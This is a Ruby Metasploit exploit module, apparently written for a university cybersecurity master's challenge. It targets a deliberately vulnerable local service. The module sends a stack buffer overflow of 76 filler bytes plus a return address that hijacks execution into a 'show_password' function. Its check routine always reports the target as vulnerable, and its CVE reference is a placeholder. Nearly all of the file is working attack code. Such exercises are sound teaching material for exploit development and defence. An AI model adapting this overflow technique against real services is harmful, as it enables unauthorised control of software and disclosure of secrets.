require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Reto HE (show_password) - UGR Master Ciberseguridad',
      'Description'	=> %q{
		Esta es la descripción del módulo. 
      },
      'Author'	=> [ 'Gabriel Macia Fernandez <gmacia@ugr.es>' ], 
      'Arch'		=> [ARCH_X86],
      'Platform'	=> 'linux',
      'References'	=>
        [
          [ 'CVE', '2017-x000' ],
        ],
      'Privileged'	=> false,
      'License'	=> MSF_LICENSE,
      'Payload'	=> {},
      'Targets'	=>
        [
          [ 'Linux (any)', {
		  'Arch' => ARCH_X86,
		  'Ret' => 0xbfffee90
	  }
	  ],
        ],
      'DefaultTarget'	=> 0,
      'DisclosureDate'  => 'Mar 23 2018'
    ))

    register_options(
      [
        Opt::RPORT(12345),
        Opt::RHOST('127.0.0.1')
      ],
      self.class
    )
  end

  def check
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    connect
    initial_status = sock.get
    print_status("Preparing buffer (76 bytes + show_password addr + \n")
    # Build the buffer for transmission
    # show_password address: 0x080493b7
    buf = "A" * 76 + "\xb7\x93\x04\x08" + "\n"
    
    sock.put(buf)
    status = sock.get
    print_status("#{status}")
  end
end
